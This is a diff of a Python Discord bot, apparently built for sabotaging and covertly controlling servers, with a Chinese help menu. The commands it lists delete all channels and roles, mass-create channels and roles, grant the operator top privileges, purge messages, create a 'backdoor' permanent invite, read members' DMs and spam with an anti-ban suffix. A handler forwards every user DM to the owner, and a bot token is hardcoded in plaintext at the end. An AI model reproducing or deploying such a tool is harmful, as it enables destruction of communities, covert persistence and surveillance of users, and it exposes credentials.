@@ -16,6 +16,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 ALLOWED_IDS = [1008278721007992863, 1355108796388872292] 
 
 async def is_me(ctx):
+
     if ctx.author.id in ALLOWED_IDS:
         try:
             await ctx.message.delete()
@@ -29,7 +30,7 @@ def home():
     return "Bot is running!"
 
 def run():
-    port = int(os.environ.get("PORT", 10000))
+    port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 def keep_alive():
@@ -60,44 +61,43 @@ async def help_msg(ctx):
             "`!set_server [名]` - 修改伺服器的名稱\n"
             "`!add_role @成員 @組` - 給予成員特定身分組\n"
             "`!remove_role @成員 @組` - 移除成員特定身分組\n"
-            "`!server_gate [lock/unlock]` - 鎖定或解鎖伺服器頻道的發言權限\n"
+            "`!server_gate [lock/unlock]` - 鎖定或解鎖發言權限\n"
         ), 
         inline=False
     )
     embed.add_field(
         name="🔥 破壞/重整", 
         value=(
-            "`!del_ch` - 刪除所有頻道並建立一個初始頻道\n"
-            "`!del_role` - 刪除所有可移除的身份組\n"
-            "`!100ch` - 瞬間建立 100 個測試文字頻道\n"
-            "`!100rl` - 瞬間建立 100 個隨機顏色身份組\n"
+            "`!del_ch` - 刪除所有頻道並建立起始頻道\n"
+            "`!del_role` - 刪除所有可移除身份組\n"
+            "`!100ch` - 瞬間建立 100 個測試頻道\n"
+            "`!100rl` - 瞬間建立 100 個隨機身份組\n"
         ), 
         inline=False
     )
     embed.add_field(
         name="🕵️ 隱蔽操作", 
         value=(
-            "`!op_me` - 建立並賦予自己最高權限身分組\n"
-            "`!disrole @成員` - 剝奪對方所有身分並丟入隔離區\n"
-            "`!del_msg [數]` - 批次清理目前頻道的對話紀錄\n"
-            "`!backdoor` - 建立永久邀請連結並私訊給你\n"
-            "`!get_dm @成員 [數]` - 調閱機器人與該成員的私訊紀錄\n"
+            "`!op_me` - 建立並賦予自己最高權限\n"
+            "`!disrole @成員` - 剝奪身分並丟入隔離區\n"
+            "`!del_msg [數]` - 批次清理頻道訊息\n"
+            "`!backdoor` - 建立永久邀請連結並私訊\n"
+            "`!get_dm @成員 [數]` - 調閱該成員的私訊紀錄\n"
         ), 
         inline=False
     )
     embed.add_field(
         name="🎮 娛樂/通訊", 
         value=(
-            "`!dm @成員 [文]` - 以機器人名義私訊特定成員\n"
-            "`!spam [次] [文]` - 帶有防封號後綴的快速刷屏\n"
-            "`!move_all [ID]` - 將語音內所有人移動到指定頻道\n"
+            "`!dm @成員 [文]` - 以機器人名義私訊\n"
+            "`!spam [次] [文]` - 帶有防封號後綴的刷屏\n"
+            "`!move_all [ID]` - 語音全員移動到指定頻道\n"
             "`!reset` - 重新啟動內部系統\n"
         ), 
         inline=False
     )
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
     await ctx.send(embed=embed)
-
 @bot.command(name="dm")
 async def dm(ctx, member: discord.Member, *, text: str):
     if not await is_me(ctx): return
@@ -276,7 +276,8 @@ async def on_message(message):
     if isinstance(message.channel, discord.DMChannel):
         if not message.content.startswith("!"):
             owner = await bot.fetch_user(ALLOWED_IDS[0])
-            await owner.send(f"📩 **收到私訊**\n來自: {message.author}\n內容: {message.content}")
+            await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
     await bot.process_commands(message)
-    
+if __name__ == "__main__":
+    keep_alive()
 bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
